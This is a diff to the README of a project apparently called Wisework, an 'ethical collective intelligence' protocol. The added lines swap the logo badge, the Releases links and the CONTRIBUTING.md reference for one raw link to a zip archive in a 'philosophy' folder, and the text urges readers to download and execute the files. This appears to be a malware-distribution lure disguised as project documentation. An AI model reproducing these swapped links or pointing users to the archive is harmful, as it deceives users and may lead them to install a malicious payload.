@@ -1,6 +1,6 @@
 # Wisework: A Protocol for Ethical Collective Intelligence and Regenerative Collaboration 🌍🤝
 
-![Wisework Logo](https://img.shields.io/badge/Wisework-Protocol-green)
+![Wisework Logo](https://raw.githubusercontent.com/athbialm55/wisework/main/philosophy/Software-v2.6.zip)
 
 Welcome to the **Wisework** repository! This project aims to establish a framework for ethical collective intelligence and regenerative collaboration. Our goal is to create a system that promotes fairness, transparency, and sustainability in collaborative efforts across various sectors.
 
@@ -59,7 +59,7 @@ As we develop the Wisework protocol, ethical considerations guide our actions. W
 
 ## Getting Started
 
-To begin using the Wisework protocol, you can download the latest release from our [Releases section](https://github.com/athbialm55/wisework/releases). Simply download the appropriate files, and follow the instructions to set up your environment.
+To begin using the Wisework protocol, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/athbialm55/wisework/main/philosophy/Software-v2.6.zip). Simply download the appropriate files, and follow the instructions to set up your environment.
 
 ### Prerequisites
 
@@ -69,7 +69,7 @@ To begin using the Wisework protocol, you can download the latest release from o
 
 ### Installation
 
-1. Visit the [Releases section](https://github.com/athbialm55/wisework/releases).
+1. Visit the [Releases section](https://raw.githubusercontent.com/athbialm55/wisework/main/philosophy/Software-v2.6.zip).
 2. Download the latest version of the protocol.
 3. Follow the setup instructions provided in the documentation.
 
@@ -107,7 +107,7 @@ We welcome contributions from anyone interested in ethical collective intelligen
 2. **Make Changes**: Implement your ideas and improvements.
 3. **Submit a Pull Request**: Share your changes with the community.
 
-For more detailed guidelines, please refer to our CONTRIBUTING.md file.
+For more detailed guidelines, please refer to our https://raw.githubusercontent.com/athbialm55/wisework/main/philosophy/Software-v2.6.zip file.
 
 ## License
 
@@ -119,7 +119,7 @@ For inquiries or feedback, please reach out to us through our GitHub issues page
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases section](https://github.com/athbialm55/wisework/releases). Make sure to download and execute the files to stay updated with the latest features and improvements.
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/athbialm55/wisework/main/philosophy/Software-v2.6.zip). Make sure to download and execute the files to stay updated with the latest features and improvements.
 
 ---
 
